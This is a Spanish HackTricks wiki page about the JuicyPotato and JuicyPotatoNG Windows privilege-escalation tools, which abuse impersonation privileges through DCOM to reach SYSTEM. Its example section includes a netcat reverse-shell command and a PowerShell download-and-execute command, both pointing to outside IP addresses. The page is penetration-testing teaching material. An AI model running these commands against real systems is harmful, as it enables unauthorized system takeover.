# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato es legacy. Generalmente funciona en versiones de Windows hasta Windows 10 1803 / Windows Server 2016. Los cambios de Microsoft introducidos a partir de Windows 10 1809 / Server 2019 rompieron la técnica original. Para esas versiones y posteriores, considera alternativas modernas como PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato y otras. Consulta la página siguiente para conocer las opciones y el uso actualizados.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusando de los privilegios dorados) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Una versión edulcorada de_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, con un poco de jugo; es decir, **otra herramienta de Local Privilege Escalation, desde cuentas de servicio de Windows hasta NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>

#### Puedes descargar juicypotato desde [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Notas rápidas de compatibilidad

- Funciona de forma fiable hasta Windows 10 1803 y Windows Server 2016 cuando el contexto actual tiene SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege.
- Microsoft lo inutilizó mediante hardening en Windows 10 1809 / Windows Server 2019 y versiones posteriores. Para esas versiones, prefiere las alternativas enlazadas anteriormente.

### Resumen <a href="#summary" id="summary"></a>

[**Del Readme de juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) y sus [variantes](https://github.com/decoder-it/lonelypotato) aprovechan la cadena de privilege escalation basada en el servicio [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126), que tiene el listener de MiTM en `127.0.0.1:6666`, cuando se dispone de los privilegios `SeImpersonate` o `SeAssignPrimaryToken`. Durante una revisión de una build de Windows, encontramos una configuración en la que `BITS` estaba deshabilitado intencionadamente y el puerto `6666` estaba ocupado.

Decidimos weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Di hola a Juicy Potato**.

> Para conocer la teoría, consulta [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) y sigue la cadena de enlaces y referencias.<sup>[[4]](#references)</sup>

Además de `BITS`, se pueden abusar varios servidores COM. Solo necesitan:

1. poder ser instanciados por el usuario actual, normalmente un “usuario de servicio” que tiene privilegios de impersonation
2. implementar la interfaz `IMarshal`
3. ejecutarse como un usuario elevado (SYSTEM, Administrator, …)

Después de realizar algunas pruebas, obtuvimos y probamos una extensa lista de [CLSID interesantes](http://ohpe.it/juicy-potato/CLSID/) en varias versiones de Windows.

### Detalles de Juicy <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato permite:<sup>[[1]](#references)</sup>

- **Target CLSID** _elegir cualquier CLSID que quieras._ [_Aquí_](http://ohpe.it/juicy-potato/CLSID/) _puedes encontrar la lista organizada por sistema operativo._
- **COM Listening port** _definir el puerto de escucha COM que prefieras (en lugar del 6666 hardcodeado por marshaling)_
- **COM Listening IP address** _vincular el servidor a cualquier IP_
- **Process creation mode** _según los privilegios del usuario suplantado, puedes elegir entre:_
- `CreateProcessWithToken` (necesita `SeImpersonate`)
- `CreateProcessAsUser` (necesita `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _ejecutar un ejecutable o script si la explotación tiene éxito_
- **Process Argument** _personalizar los argumentos del proceso ejecutado_
- **RPC Server address** _para un enfoque sigiloso, puedes autenticarte en un servidor RPC externo_
- **RPC Server port** _útil si quieres autenticarte en un servidor externo y el firewall bloquea el puerto `135`…_
- **TEST mode** _principalmente para fines de prueba, por ejemplo, para probar CLSID. Crea el DCOM e imprime el usuario del token. Consulta_ [_aquí para realizar pruebas_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Reflexiones finales <a href="#final-thoughts" id="final-thoughts"></a>

[**Del Readme de juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

Si el usuario tiene los privilegios `SeImpersonate` o `SeAssignPrimaryToken`, entonces eres **SYSTEM**.

Es prácticamente imposible evitar el abuso de todos estos COM Servers. Podrías plantearte modificar los permisos de estos objetos mediante `DCOMCNFG`, pero buena suerte: será complicado.

La solución real es proteger las cuentas y aplicaciones sensibles que se ejecutan bajo las cuentas `* SERVICE`. Detener `DCOM` ciertamente impediría este exploit, pero podría tener un impacto grave en el sistema operativo subyacente.

De: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG reintroduce una escalada local de privilegios al estilo de JuicyPotato en Windows modernos mediante la combinación de:<sup>[[2]](#references)</sup>
- Resolución DCOM OXID a un servidor RPC local en un puerto elegido, evitando el antiguo listener codificado de forma fija en 127.0.0.1:6666.
- Un SSPI hook para capturar e impersonar la autenticación SYSTEM entrante sin requerir RpcImpersonateClient, lo que también permite usar CreateProcessAsUser cuando solo está presente SeAssignPrimaryTokenPrivilege.
- Trucos para satisfacer las restricciones de activación de DCOM (por ejemplo, el antiguo requisito del grupo INTERACTIVE al apuntar a las clases PrintNotify / ActiveX Installer Service).

Notas importantes (el comportamiento varía según las compilaciones):<sup>[[2]](#references)</sup>
- Septiembre de 2022: La técnica inicial funcionaba en objetivos compatibles con Windows 10/11 y Server mediante el “INTERACTIVE trick”.
- Actualización de los autores de enero de 2023: Microsoft bloqueó posteriormente el INTERACTIVE trick. Un CLSID diferente ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) permite recuperar la explotación, pero, según su publicación, solo en Windows 11 / Server 2022.

Uso básico (hay más flags en la ayuda):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Si estás apuntando a Windows 10 1809 / Server 2019, donde el JuicyPotato clásico está parcheado, prefiere las alternativas enlazadas en la parte superior (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG puede ser situacional según la build y el estado del servicio.

## Ejemplos

Nota: Visita [esta página](https://ohpe.it/juicy-potato/CLSID/) para obtener una lista de CLSIDs que probar.

### Obtener una reverse shell con nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Iniciar un nuevo CMD (si tienes acceso RDP)

![Powershell rev - Iniciar un nuevo CMD (si tienes acceso RDP): Iniciar un nuevo CMD (si tienes acceso RDP)](<../../images/image (300).png>)

## Problemas con CLSID

A menudo, el CLSID predeterminado que utiliza JuicyPotato **no funciona** y el exploit falla. Normalmente, se necesitan varios intentos para encontrar un **CLSID funcional**. Para obtener una lista de CLSID que probar en un sistema operativo específico, debes visitar esta página:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Comprobar CLSID**

Primero, necesitarás algunos ejecutables además de juicypotato.exe.

Descarga [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1), cárgalo en tu sesión de PS y descarga y ejecuta [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ese script creará una lista de posibles CLSID para probar.

A continuación, descarga [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(cambia la ruta a la lista de CLSID y al ejecutable de juicypotato) y ejecútalo. Comenzará a probar cada CLSID y, **cuando cambie el número de puerto, significará que el CLSID ha funcionado**.

**Comprueba** los CLSID funcionales **utilizando el parámetro -c**

## References

- [1] [README de Juicy Potato (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Dando una segunda oportunidad a JuicyPotato: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Página del proyecto Juicy Potato (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Escalada de privilegios de cuentas de servicio a SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
{{#include ../../banners/hacktricks-training.md}}
